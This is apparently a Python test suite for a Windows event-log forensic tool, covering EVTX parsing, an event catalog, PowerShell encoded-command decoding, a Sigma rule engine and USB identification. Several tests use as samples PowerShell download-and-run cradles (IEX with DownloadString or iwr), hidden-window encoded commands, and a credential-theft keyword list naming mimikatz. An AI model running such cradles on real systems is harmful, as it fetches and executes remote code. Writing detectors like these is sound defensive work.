"""Windows event logs: the EVTX writer read back by libevtx and python-evtx, record parsing, the event catalog, PowerShell
-EncodedCommand decoding, the Sigma rule engine (values, modifiers, conditions, counting rules), the shipped rules and
USB device identities."""
import base64
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent / 'fixtures'))
import evtx as w  # noqa: E402

from app.forensic import event_catalog as cat  # noqa: E402
from app.forensic import sigma_lite as sl  # noqa: E402
from app.forensic.eventlogs import EvtxLog, field_name, parse_xml, read_record, systemtime  # noqa: E402
from app.forensic.modules.eventlogs import log_label, usb_identity  # noqa: E402

T0 = datetime(2026, 9, 1, 14, 0, 0, 123456, tzinfo=timezone.utc)
SEC = ('Security', 'Microsoft-Windows-Security-Auditing', '{54849625-5478-4994-A5BA-3E3B0328C30D}')
ALICE = 'S-1-5-21-1-2-3-1001'


def _write(tmp_path, events, first=1, name='t.evtx'):
    p = tmp_path / name
    p.write_bytes(w.write_evtx(events, first_record_id=first))
    return p


def _records(path, cap=100_000):
    log = EvtxLog(path, cap)
    return list(log.records()), log.stats


# ------------------------------------------------------------------------------------- writer and reader
def test_writer_round_trip_through_libevtx_and_python_evtx(tmp_path):
    from Evtx.Evtx import Evtx
    events = [w.Event(*SEC, 4624, T0 + timedelta(seconds=i), {'TargetUserName': f'user{i}', 'LogonType': '2', 'Empty': ''},
                      user_sid=ALICE if i % 2 else None) for i in range(150)]   # more than one 64 KiB chunk
    events.append(w.Event('Windows PowerShell', 'PowerShell', '', 400, T0, ['Available', 'None', 'HostApplication=powershell.exe']))
    events.append(w.Event('Security', 'Microsoft-Windows-Eventlog', '{fc65ddd8-d6ef-4962-83d5-6e5cfe9ce148}', 1102, T0, {},
                          user_data=('LogFileCleared', 'http://manifests.microsoft.com/win/2004/08/windows/eventlog',
                                     {'SubjectUserName': 'alice', 'SubjectDomainName': 'PC'})))
    p = _write(tmp_path, events, first=500)
    recs, stats = _records(p)
    assert stats['records'] == len(events) and stats['recovered'] == 0 and not stats['capped'] and stats['chunks'] >= 2
    assert [r['record_id'] for r in recs] == list(range(500, 500 + len(events)))
    first = recs[0]
    assert (first['event_id'], first['channel'], first['provider'], first['computer']) == (4624, 'Security', SEC[1], 'LAPTOP-07')
    assert first['time'] == T0 and first['data'] == {'TargetUserName': 'user0', 'LogonType': '2', 'Empty': ''}
    assert recs[1]['user_sid'] == ALICE and recs[0].get('user_sid') is None
    assert recs[150]['data'] == {} and recs[150]['data_values'] == ['Available', 'None', 'HostApplication=powershell.exe']
    assert recs[151]['user_data'] == 'LogFileCleared' and recs[151]['data'] == {'SubjectUserName': 'alice', 'SubjectDomainName': 'PC'}
    assert not any(r.get('parse_error') for r in recs)
    # python-evtx, an independent reader, sees the same records.
    with Evtx(str(p)) as log:
        theirs = list(log.records())
        assert len(theirs) == len(events)
        assert [x.record_num() for x in theirs] == [r['record_id'] for r in recs]
        # python-evtx converts FILETIMEs with floating point and can be 1 microsecond off; ours is exact (T0 + 5 s).
        assert recs[5]['time'] == T0 + timedelta(seconds=5)
        assert abs(theirs[5].timestamp().replace(tzinfo=timezone.utc) - recs[5]['time']) <= timedelta(microseconds=1)


def test_record_cap_and_empty_log(tmp_path):
    p = _write(tmp_path, [w.Event(*SEC, 4624, T0, {}) for _ in range(10)])
    recs, stats = _records(p, cap=4)
    assert len(recs) == 4 and stats['capped']
    empty = _write(tmp_path, [], name='empty.evtx')
    recs, stats = _records(empty)
    assert recs == [] and stats['valid'] and stats['records'] == 0
    junk = tmp_path / 'junk.evtx'
    junk.write_bytes(b'not a log' * 100)
    recs, stats = _records(junk)
    assert recs == [] and not stats['valid'] and stats['errors']


def test_systemtime_keeps_microseconds():
    assert systemtime('2026-09-01T14:12:44.123456789Z') == datetime(2026, 9, 1, 14, 12, 44, 123456, tzinfo=timezone.utc)
    assert systemtime('2026-09-01T14:12:44Z') == datetime(2026, 9, 1, 14, 12, 44, tzinfo=timezone.utc)
    assert systemtime('2026-09-01 14:12:44.5') == datetime(2026, 9, 1, 14, 12, 44, 500000, tzinfo=timezone.utc)
    assert systemtime('') is None and systemtime(None) is None and systemtime('yesterday') is None


def test_parse_xml_names_and_flattening():
    xml = ('<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID Qualifiers="16384">7036</EventID>'
           '<TimeCreated SystemTime="2026-09-01T10:00:00.0000000Z"/><Channel>System</Channel></System>'
           '<EventData><Data Name="a.b">1</Data><Data Name="x">2</Data><Data Name="x">3</Data><Binary>00FF</Binary></EventData></Event>')
    rec = parse_xml(xml)
    assert rec['event_id'] == 7036 and rec['qualifiers'] == 16384
    assert rec['data'] == {'a_b': '1', 'x': '2', 'x#2': '3', 'Binary': '00FF'}
    xml = ('<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID>2003</EventID></System><UserData>'
           '<UMDFHostDeviceRequest xmlns="x" instance="USBSTOR\\DISK&amp;VEN_A\\123&amp;0" lifetime="{1}"><Request><Major>27</Major>'
           '</Request><Status>0</Status></UMDFHostDeviceRequest></UserData></Event>')
    rec = parse_xml(xml)
    assert rec['user_data'] == 'UMDFHostDeviceRequest'
    assert rec['data'] == {'instance': 'USBSTOR\\DISK&VEN_A\\123&0', 'lifetime': '{1}', 'Request/Major': '27', 'Status': '0'}
    assert field_name('$where') == '_where' and field_name('a.b.c') == 'a_b_c'


def test_parse_xml_keeps_control_characters_and_complex_data():
    # libevtx writes control characters as they are (not allowed in XML 1.0); the value must come back unchanged.
    xml = ('<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID>4739</EventID></System><EventData>'
           '<Data Name="MinPasswordAge">\x03</Data><Data Name="Other">a\x01b</Data><ComplexData Name="IdleState">01</ComplexData>'
           '<ComplexData Name="PerfState"/></EventData></Event>')
    rec = parse_xml(xml)
    assert rec['data'] == {'MinPasswordAge': '\x03', 'Other': 'a\x01b', 'IdleState': '01', 'PerfState': ''}
    clean = xml.replace('\x03', '').replace('a\x01b', 'ab')   # a private-use character is untouched when nothing was swapped
    assert parse_xml(clean)['data']['MinPasswordAge'] == ''


def test_parse_xml_refuses_entities():
    with pytest.raises(Exception):
        parse_xml('<!DOCTYPE x [<!ENTITY e "boom">]><Event><System><EventID>&e;</EventID></System></Event>')


class _FakeRecord:
    """A record whose XML libevtx rendered badly: the API fields are used instead."""
    identifier, event_identifier, source_name, channel_name, computer_name = 7, 6005, 'EventLog', 'System', 'PC'
    user_security_identifier, event_level, number_of_strings, offset = None, 4, 2, 4096
    xml_string = '<Event><System><Provider Name="EventLog" Guid="/></System></Event>'

    def get_string(self, i):
        return ['a', 'b'][i]

    def get_creation_time_as_integer(self):
        return w.filetime(T0)

    def get_written_time_as_integer(self):
        return 0


def test_unparseable_xml_falls_back_to_libevtx_fields():
    rec = read_record(_FakeRecord())
    assert 'not well formed' in rec['parse_error']
    assert (rec['record_id'], rec['event_id'], rec['provider'], rec['channel']) == (7, 6005, 'EventLog', 'System')
    assert rec['data_values'] == ['a', 'b'] and rec['time'] == T0 and rec['xml'].startswith('<Event>')


# ------------------------------------------------------------------------------------- catalog
def _rec(channel, provider, eid, data=None, **kw):
    return dict(channel=channel, provider=provider, event_id=eid, data=data or {}, data_values=kw.pop('values', []), **kw)


def test_logons_and_failed_logons_are_described():
    names = {ALICE: 'alice'}.get
    r = _rec('Security', SEC[1], 4624, {'TargetUserName': 'alice', 'TargetDomainName': 'PC', 'TargetUserSid': ALICE, 'LogonType': '10',
                                         'IpAddress': '10.0.0.5', 'WorkstationName': 'JUMP'})
    d = cat.describe(r, names)
    assert d['description'] == 'PC\\alice logged on (Remote interactive (Remote Desktop), type 10) from 10.0.0.5 (workstation JUMP)'
    assert d['notable'] and d['timeline'] == 'LOGON' and d['user'] == 'alice' and d['category'] == 'LOGON'
    system = _rec('Security', SEC[1], 4624, {'TargetUserName': 'SYSTEM', 'TargetUserSid': 'S-1-5-18', 'LogonType': '5'})
    assert not cat.describe(system, names)['notable'] and cat.describe(system, names)['user'] is None
    machine = _rec('Security', SEC[1], 4624, {'TargetUserName': 'PC$', 'TargetUserSid': 'S-1-5-21-9', 'LogonType': '3'})
    assert not cat.describe(machine, names)['notable']
    failed = _rec('Security', SEC[1], 4625, {'TargetUserName': 'bob', 'LogonType': '3', 'Status': '0xC000006D', 'SubStatus': '0xC0000064',
                                              'IpAddress': '192.0.2.9'})
    assert cat.describe(failed, names)['description'].endswith('from 192.0.2.9: user name does not exist')
    failed['data']['SubStatus'] = '0x0'
    assert cat.describe(failed, names)['description'].endswith('bad user name or password')
    failed['data']['Status'], failed['data']['SubStatus'] = '0xC00000AA', ''
    assert cat.describe(failed, names)['description'].endswith('status 0xc00000aa')


def test_group_membership_names_the_member_and_log_clearing_the_actor():
    names = {'S-1-5-21-1-2-3-1002': 'backup_admin'}.get
    r = _rec('Security', SEC[1], 4732, {'MemberName': '-', 'MemberSid': 'S-1-5-21-1-2-3-1002', 'TargetUserName': 'Administrators',
                                         'TargetDomainName': 'Builtin', 'SubjectUserName': 'alice', 'SubjectDomainName': 'PC'})
    d = cat.describe(r, names)
    assert d['description'] == 'backup_admin added to group Builtin\\Administrators by PC\\alice' and d['user'] == 'backup_admin'
    r['data']['MemberName'] = 'CN=Bob Smith,OU=Staff,DC=corp,DC=example'
    assert cat.describe(r, names)['description'].startswith('Bob Smith added to group')
    cleared = _rec('Security', 'Microsoft-Windows-Eventlog', 1102, {'SubjectUserName': 'alice', 'SubjectDomainName': 'PC'})
    d = cat.describe(cleared, names)
    assert d['description'] == 'Security log cleared by PC\\alice' and d['timeline'] == 'LOG_CLEARED' and d['user'] == 'alice'
    # The same ID from another provider is not "log cleared".
    assert cat.describe(_rec('Security', 'Other', 1102), names)['category'] is None


def test_provider_tells_apart_events_that_share_an_id():
    names = {ALICE: 'alice'}.get
    logon = cat.describe(_rec('System', 'Microsoft-Windows-Winlogon', 7001, {'TSId': '1', 'UserSid': ALICE}, user_sid='S-1-5-18'), names)
    assert logon['description'] == 'alice logged on (Winlogon)' and logon['timeline'] == 'LOGON' and logon['user'] == 'alice'
    scm = cat.describe(_rec('System', 'Service Control Manager', 7001, values=['Spooler', 'RPC']), names)
    assert scm['category'] is None and not scm['notable']


def test_devices_powershell_and_uncatalogued_events():
    names = {}.get
    disk = {'Manufacturer': 'SanDisk', 'Model': 'Cruzer Blade', 'SerialNumber': '4C53', 'Capacity': '15931539456'}
    part = 'Microsoft-Windows-Partition/Diagnostic'
    assert cat.describe(_rec(part, 'Microsoft-Windows-Partition', 1006, disk), names)['description'] == \
        'Disk connected: SanDisk Cruzer Blade, 15.9 GB (serial 4C53)'
    assert cat.describe(_rec(part, 'Microsoft-Windows-Partition', 1006, dict(disk, Capacity='0')), names)['description'] == \
        'Disk removed: SanDisk Cruzer Blade (serial 4C53)'
    ps = 'Microsoft-Windows-PowerShell/Operational'
    block = _rec(ps, 'Microsoft-Windows-PowerShell', 4104, {'ScriptBlockText': 'Get-Date', 'MessageNumber': '1', 'MessageTotal': '1'}, level=5)
    assert not cat.describe(block, names)['notable']
    block['level'] = 3
    d = cat.describe(block, names)
    assert d['notable'] and d['description'] == 'PowerShell script block (Windows logged it as suspicious): Get-Date'
    unknown = cat.describe(_rec('Application', 'Something', 1234), names)
    assert unknown == {'user': None, 'category': None, 'title': None, 'description': None, 'timeline': None, 'notable': False}


def test_every_catalog_entry_describes_an_empty_event():
    for (channel, eid), entries in cat.CATALOG.items():
        for e in entries:
            d = cat.describe(_rec(channel, e.provider or 'X', eid, level=4), {}.get)
            assert d['category'] == e.category and d['description'], (channel, eid)


# ------------------------------------------------------------------------------------- PowerShell
def _enc(script):
    return base64.b64encode(script.encode('utf-16-le')).decode()


@pytest.mark.parametrize('command', [
    'powershell.exe -NoProfile -EncodedCommand {}', 'powershell -enc {}', 'powershell -e {}', 'powershell -ec {}', 'powershell /enc {}',
    "powershell -w hidden -encodedc '{}'", 'powershell -ENCODED {}',
])
def test_encoded_commands_are_decoded(command):
    assert cat.decode_encoded_command(command.format(_enc('IEX (iwr http://x/a)'))) == 'IEX (iwr http://x/a)'


@pytest.mark.parametrize('command', [
    'powershell -ep bypass -File a.ps1', 'powershell -ex bypass ' + 'A' * 40, 'powershell -enc !!notbase64!!',
    'powershell -enc ' + base64.b64encode(b'\x00\x01\x02\x03\x04\x05').decode(), 'cmd /c dir', '',
])
def test_other_commands_are_not_decoded(command):
    assert cat.decode_encoded_command(command) is None


def test_encoded_powershell_start_is_described_with_the_decoded_script():
    encoded = _enc('IEX (New-Object Net.WebClient).DownloadString("https://x.example/a")')
    rec = _rec('Windows PowerShell', 'PowerShell', 400, details={'HostApplication': f'powershell.exe -w hidden -enc {encoded}'})
    d = cat.describe(rec, {}.get)
    assert d['description'] == (f'PowerShell started: powershell.exe -w hidden -enc {encoded[:24]}… '
                                '(decoded command: IEX (New-Object Net.WebClient).DownloadString("https://x.example/a"))')
    plain = _rec('Windows PowerShell', 'PowerShell', 400, details={'HostApplication': 'powershell.exe -File C:\\a.ps1'})
    assert cat.describe(plain, {}.get)['description'] == 'PowerShell started: powershell.exe -File C:\\a.ps1'


def test_classic_powershell_details():
    text = 'NewEngineState=Available\r\n\tHostName=ConsoleHost\r\n\tHostApplication=powershell.exe -c "a=b"\r\n\tEngineVersion=5.1\r\n'
    d = cat.classic_powershell_details(text)
    assert d == {'NewEngineState': 'Available', 'HostName': 'ConsoleHost', 'HostApplication': 'powershell.exe -c "a=b"', 'EngineVersion': '5.1'}


# ------------------------------------------------------------------------------------- Sigma engine
def _rule(detection, service='security', **extra):
    return sl.compile_rule({'title': 'T', 'id': 'r1', 'logsource': {'product': 'windows', 'service': service}, 'detection': detection, **extra})


def _sec(eid=4688, **data):
    return {'channel': 'Security', 'event_id': eid, 'data': {k: str(v) for k, v in data.items()}, 'data_values': []}


@pytest.mark.parametrize('spec,value,hit', [
    ({'ImagePath|contains': '\\Users\\'}, 'C:\\Users\\alice\\x.exe', True),        # a trailing backslash stays literal
    ({'ImagePath|contains': '\\Users\\'}, 'C:\\Windows\\x.exe', False),
    ({'ImagePath|endswith': '.EXE'}, 'c:\\a\\b.exe', True),                         # case-insensitive by default
    ({'ImagePath|endswith|cased': '.EXE'}, 'c:\\a\\b.exe', False),
    ({'ImagePath|startswith': 'C:\\Users\\'}, 'C:\\Users\\a', True),
    ({'ImagePath': 'C:\\\\*\\\\b?.exe'}, 'c:\\one\\two\\b1.exe', True),           # \\ before a wildcard is one backslash
    ({'ImagePath': 'C:\\\\*\\\\b?.exe'}, 'c:\\one\\two\\b12.exe', False),
    ({'ImagePath': 'C:\\*'}, 'C:*', True),                                          # \* is a literal star
    ({'ImagePath': 'C:\\*'}, 'C:\\x', False),
    ({'ImagePath': 'a\\*b'}, 'a*b', True),                                          # escaped wildcard
    ({'ImagePath': 'a\\*b'}, 'axxb', False),
    ({'ImagePath|contains|all': ['IEX', 'Download']}, 'iex (x.DownloadString(1))', True),
    ({'ImagePath|contains|all': ['IEX', 'Download']}, 'iex (x)', False),
    ({'ImagePath|re': '^C:\\\\Users\\\\[^\\\\]+\\\\AppData'}, 'C:\\Users\\a\\AppData\\x', True),
    ({'ImagePath|re': 'appdata'}, 'C:\\AppData', False),                             # re is case-sensitive
    ({'ImagePath|re|i': 'appdata'}, 'C:\\AppData', True),
    ({'ImagePath|windash|contains': ' -enc '}, 'powershell /enc AAAA', True),
    ({'ImagePath': None}, '', True),
    ({'ImagePath': ['x', 'C:\\a']}, 'c:\\A', True),
])
def test_values_and_modifiers(spec, value, hit):
    rule = _rule({'sel': spec, 'condition': 'sel'})
    assert bool(rule.match(_sec(ImagePath=value))) is hit


def test_numbers_missing_fields_keywords_and_unnamed_data():
    assert _rule({'s': {'EventID': 4688}, 'condition': 's'}).match(_sec(4688))
    assert not _rule({'s': {'EventID': [4624, 4625]}, 'condition': 's'}).match(_sec(4688))
    assert _rule({'s': {'LogonType': 10}, 'condition': 's'}).match(_sec(LogonType='10'))
    assert not _rule({'s': {'Missing': 'x'}, 'condition': 's'}).match(_sec())
    assert _rule({'s': {'Missing': None}, 'condition': 's'}).match(_sec())
    kw = _rule({'k': ['mimikatz', 'sekurlsa'], 'condition': 'k'})
    assert kw.match(_sec(CommandLine='run MimiKatz.exe')) and not kw.match(_sec(CommandLine='notepad'))
    classic = {'channel': 'Windows PowerShell', 'event_id': 400, 'data': {}, 'data_values': ['Available', 'HostApplication=pwsh -enc AAA']}
    assert _rule({'s': {'Data|contains': '-enc'}, 'condition': 's'}, 'powershell-classic').match(classic)
    assert not _rule({'s': {'eventid': 4688}, 'condition': 's'}).match(_sec(4688))  # System fields are matched by their exact names


def test_conditions():
    rule = _rule({'sel_a': {'A': '1'}, 'sel_b': {'B': '1'}, 'filter': {'C': '1'}, 'condition': '(sel_a or sel_b) and not filter'})
    assert rule.match(_sec(A=1)) and rule.match(_sec(B=1)) and not rule.match(_sec(A=1, C=1)) and not rule.match(_sec(D=1))
    assert _rule({'sel_a': {'A': '1'}, 'sel_b': {'B': '1'}, 'condition': 'all of sel_*'}).match(_sec(A=1, B=1))
    assert not _rule({'sel_a': {'A': '1'}, 'sel_b': {'B': '1'}, 'condition': 'all of sel_*'}).match(_sec(A=1))
    assert _rule({'x': {'A': '1'}, 'y': {'B': '1'}, 'condition': '1 of them'}).match(_sec(B=1))
    assert _rule({'x': [{'A': '1'}, {'B': '1'}], 'condition': 'x'}).match(_sec(B=1))   # a list of maps is "any map"
    assert _rule({'x': {'A': '1'}, 'condition': 'not not x'}).match(_sec(A=1))


@pytest.mark.parametrize('detection,extra,message', [
    ({'s': {'A|base64': 'x'}, 'condition': 's'}, {}, 'unsupported modifier'),
    ({'s': {'A': 'x'}, 'condition': 't'}, {}, 'unknown search identifier'),
    ({'s': {'A': 'x'}, 'condition': 's and'}, {}, 'ends unexpectedly'),
    ({'s': {'A': 'x'}, 'condition': '1 of z*'}, {}, 'matches no search identifier'),
    ({'s': {'A': 'x'}, 'condition': 's | max(A) > 3'}, {}, 'aggregations are supported'),
    ({'s': {'A': 'x'}, 'condition': 's | count() > 3', 'timeframe': '5w'}, {}, 'timeframe'),
    ({'s': {'A': 'x'}, 'timeframe': '5m', 'condition': 's'}, {}, 'timeframe needs an aggregation'),
    ({'s': {'A|re': '(a'}, 'condition': 's'}, {}, 'RE2'),
    ({'s': {'A|re': '(a)\\1'}, 'condition': 's'}, {}, 'RE2'),                      # no backreferences in RE2
    ({'s': 'x', 'condition': 's'}, {}, 'must be a map'),
])
def test_rule_errors(detection, extra, message):
    with pytest.raises(sl.RuleError, match=message):
        _rule(detection, **extra)


def test_logsource_and_level_checks():
    with pytest.raises(sl.RuleError, match='service'):
        sl.compile_rule({'title': 'T', 'id': 'x', 'logsource': {'product': 'windows', 'service': 'nope'}, 'detection': {'s': {'A': 1}, 'condition': 's'}})
    with pytest.raises(sl.RuleError, match='product'):
        sl.compile_rule({'title': 'T', 'id': 'x', 'logsource': {'product': 'linux'}, 'detection': {'s': {'A': 1}, 'condition': 's'}})
    with pytest.raises(sl.RuleError, match='level'):
        _rule({'s': {'A': 1}, 'condition': 's'}, level='severe')
    rule = sl.compile_rule({'title': 'T', 'id': 'x', 'logsource': {'product': 'windows', 'category': 'ps_script'},
                            'detection': {'s': {'ScriptBlockText|contains': 'iex'}, 'condition': 's'}})
    assert rule.event_ids == {4104} and 'microsoft-windows-powershell/operational' in rule.channels


def _failures(times, ip='192.0.2.9', users=None):
    return [{'channel': 'Security', 'event_id': 4625, 'time': t, 'data': {'IpAddress': ip, 'TargetUserName': (users or ['admin'])[i % len(users or ['admin'])]},
             'data_values': []} for i, t in enumerate(times)]


def test_counting_rules_use_a_sliding_window():
    rule = _rule({'s': {'EventID': 4625}, 'timeframe': '10m', 'condition': 's | count() by IpAddress > 10'})
    run = lambda recs: (lambda e: ([e.match(r, f'k{i}') for i, r in enumerate(recs)], e.finish())[1])(sl.Engine([rule]))
    eleven = [T0 + timedelta(seconds=55 * i) for i in range(11)]          # 11 within 9 min 10 s
    found = run(_failures(eleven))
    assert len(found) == 1 and found[0]['count'] == 11 and found[0]['group'] == {'IpAddress': '192.0.2.9'}
    assert found[0]['first'] == eleven[0] and found[0]['last'] == eleven[-1] and len(found[0]['record_keys']) == 11
    assert run(_failures(eleven[:10])) == []                                # exactly 10 is not "more than 10"
    assert run(_failures([T0 + timedelta(minutes=2 * i) for i in range(11)])) == []   # spread over 20 minutes
    # Two addresses with 6 each do not add up.
    assert run(_failures(eleven[:6], ip='a') + _failures(eleven[:6], ip='b')) == []
    # The window boundary is inclusive: 11 failures exactly 10 minutes apart end to end.
    assert len(run(_failures([T0 + timedelta(seconds=60 * i) for i in range(11)]))) == 1


def test_counting_distinct_values():
    rule = _rule({'s': {'EventID': 4625}, 'timeframe': '30m', 'condition': 's | count(TargetUserName) by IpAddress > 5'})
    eng = sl.Engine([rule])
    for i, r in enumerate(_failures([T0 + timedelta(seconds=i) for i in range(20)], users=['admin', 'bob'])):
        eng.match(r, str(i))
    assert eng.finish() == []                                              # 20 failures, but only two accounts
    eng = sl.Engine([rule])
    for i, r in enumerate(_failures([T0 + timedelta(seconds=i) for i in range(6)], users=['u1', 'u2', 'u3', 'u4', 'u5', 'u6'])):
        eng.match(r, str(i))
    assert [d['count'] for d in eng.finish()] == [6]


def test_shipped_rules_compile_and_fire_on_the_right_events():
    rules = sl.load_rules()
    assert len(rules) >= 12 and len({r.id for r in rules}) == len(rules)
    eng = sl.Engine(rules)
    title = {r.id: r.title for r in rules}
    hits = lambda rec: [title[i] for i in eng.match(rec, 'k')]
    service = {'channel': 'System', 'provider': 'Service Control Manager', 'event_id': 7045,
               'data': {'ServiceName': 'x', 'ImagePath': 'C:\\Users\\alice\\AppData\\Roaming\\sdsvc.exe'}, 'data_values': []}
    assert hits(service) == ['Service installed from a user or temporary folder, or running a script']
    assert hits(dict(service, data={'ServiceName': 'Spooler', 'ImagePath': 'C:\\Windows\\System32\\spoolsv.exe'})) == []
    ps = {'channel': 'Windows PowerShell', 'event_id': 400, 'data': {}, 'data_values': [],
          'details': {'HostApplication': 'powershell.exe -NoProfile -EncodedCommand ' + _enc('Get-Date')}}
    assert hits(ps) == ['PowerShell started with an encoded command']
    assert hits(dict(ps, details={'HostApplication': 'powershell.exe -ExecutionPolicy Bypass -File a.ps1'})) == []
    cradle = {'channel': 'Microsoft-Windows-PowerShell/Operational', 'event_id': 4104, 'data_values': [],
              'data': {'ScriptBlockText': 'IEX (New-Object Net.WebClient).DownloadString("http://x")'}}
    assert hits(cradle) == ['PowerShell downloads and runs code']
    assert hits(dict(cradle, data={'ScriptBlockText': '(New-Object Net.WebClient).DownloadString("http://x") | Out-File a'})) == []
    assert hits(_sec(4732, TargetSid='S-1-5-32-544', MemberSid='S-1-5-21-9')) == ['Account added to the Administrators group']
    assert hits(_sec(4732, TargetSid='S-1-5-32-545', MemberSid='S-1-5-21-9')) == []
    assert hits(_sec(4624, LogonType=10)) == ['Remote Desktop logon'] and hits(_sec(4624, LogonType=2)) == []


# ------------------------------------------------------------------------------------- USB
def test_usb_identity():
    part = {'data': {'SerialNumber': 'DISKSERIAL', 'ParentId': 'USB\\VID_0781&PID_5567\\4C530001230518109141', 'Manufacturer': 'SanDisk',
                     'Model': 'Cruzer Blade'}}
    assert usb_identity(part) == {'vid': '0781', 'pid': '5567', 'serial': '4C530001230518109141', 'vendor': 'SanDisk', 'product': 'Cruzer Blade'}
    pnp = {'data': {'DeviceInstanceId': 'USBSTOR\\DISK&VEN_KINGSTON&PROD_DATATRAVELER_3.0&REV_PMAP\\60A44C3FAE22EEA0797900F7&0'}}
    ident = usb_identity(pnp)
    assert ident['serial'] == '60A44C3FAE22EEA0797900F7' and ident['vendor'] == 'KINGSTON' and ident['product'] == 'DATATRAVELER 3.0'
    wpd = {'data': {'instance': 'SWD\\WPDBUSENUM\\_??_USBSTOR#DISK&VEN_SANDISK&PROD_CRUZER&REV_1.00#4C53000123&0#{53f56307}'}}
    assert usb_identity(wpd)['serial'] == '4C53000123'
    assert usb_identity({'data': {'SerialNumber': ' ABC '}})['serial'] == 'ABC'
    assert usb_identity({'data': {'DeviceInstanceId': 'PCI\\VEN_8086&DEV_1234\\3&11583659&0&10'}}) is None


def test_log_label():
    assert log_label('Microsoft-Windows-Partition%4Diagnostic.evtx') == 'Microsoft-Windows-Partition/Diagnostic'
    assert log_label('Security.evtx') == 'Security'
